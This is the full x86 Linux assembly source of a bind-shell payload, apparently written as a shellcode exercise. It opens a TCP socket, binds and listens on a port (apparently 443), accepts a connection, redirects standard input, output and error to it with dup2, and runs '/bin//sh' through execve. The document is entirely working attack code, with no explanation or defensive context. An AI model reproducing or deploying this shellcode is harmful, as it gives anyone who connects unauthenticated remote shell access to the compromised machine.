global _start

section .text  
_start:

socket:
	xor eax,eax
	push eax	;IPPROTO_IP = 0
	inc eax
	push eax	;SOCK_STREAM = 1
	mov ebx, eax	; socket call number 1 which is SYS_SOCKET
	inc eax
	push eax	;AF_INET = 2
	mov ecx, esp	;args for socket() which is (AF_INET,SOCK_STREAM,IPPROTO_IP)
	mov al,0x66	; syscall number for socketcall
	int 0x80
	mov ebx,eax

	;input ebx=fd
bind:	
	push 0x0			;ip address 
	push dword 0xbb010002		;first 2 byte for port number, the last two for AF_INET
	mov ecx, esp 			; address of steruct_addr* to pass for bind()
	;args for bind 
	push 102
	push ecx
	push ebx
	mov ecx, esp			;args for bind() in order, (fd, [AF_INET,port_number,ipaddr], structlen)
        mov edi, ebx   			; save the fd
	mov bl, 0x2			; socketcall number for bind
        mov al,0x66     		; syscall number for socketcall
	int 0x80
	
mov ebx,edi
listen:
        xor eax,eax
	push eax	;null 
	push ebx	;fd
	mov ecx,esp	; args for listen
	mov edi, ebx	; save the fd 
	mov bl,0x4	;socketcall number for listen
	mov al,0x66     ; syscall number for socketcall
	int 0x80

mov ebx,edi
accept:
	xor eax, eax	
	push eax	; null
	push eax	; null
	push ebx	; fd
	mov ecx, esp	; args for accept
	mov bl, 0x5	; socketcall number for accept
        mov al,0x66     ; syscall number for socketcall
	int 0x80	


    ;input , ebx=fd  
        mov ebx,eax     ; move the file descriptor returned from connect to ebx for dup2()
        mov ecx, 0x3    ; loop counter, will be used for file descriptor
    
loop_dup2:
        mov al, 0x3f     ; syscall number for dup2
        dec ecx
        int 0x80
        jnz loop_dup2




	;input ebx=fd
exec:
	xor eax,eax
	push eax		; push 0 to null out our next string
	push dword 0x68732f6e
	push dword 0x69622f2f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80


